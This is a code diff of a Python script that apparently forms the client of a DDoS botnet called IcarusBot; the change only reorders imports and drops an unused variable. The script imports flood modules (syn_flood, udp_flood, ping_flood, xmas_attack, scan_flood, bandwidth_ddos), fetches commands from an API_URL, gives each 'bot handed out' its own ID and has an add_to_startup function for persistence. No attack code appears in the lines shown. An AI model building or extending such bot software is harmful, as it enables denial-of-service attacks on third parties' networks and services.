@@ -1,23 +1,26 @@
 # Keen to start
-import signal
-import socket
-import json
-import threading
-import time
+import bandwidth_ddos
 import getpass
+import json
 import math
 import os
-import sys
+import ping_flood
+import requests
+import scan_flood
 import shutil
+import signal
+import socket
 import speedtest
+import syn_flood
+import sys
+import threading
+import time
+import udp_flood
+import xmas_attack
+from config import API_URL
 from enum import Enum
 from socket import timeout
-import syn_flood, xmas_attack, ping_flood, udp_flood, scan_flood, bandwidth_ddos
-
-import requests
 from win10toast import ToastNotifier
-
-from config import API_URL
 
 BOT_ID_NAME = ''  # Replace this for each new bot handed out.
 NUM_PACKETS_TO_SEND = 1
@@ -271,7 +274,7 @@ def add_to_startup(file_path=""):
 
 
 def main():
-    bot = IcarusBot()
+    IcarusBot()
 
 
 if __name__ == "__main__":
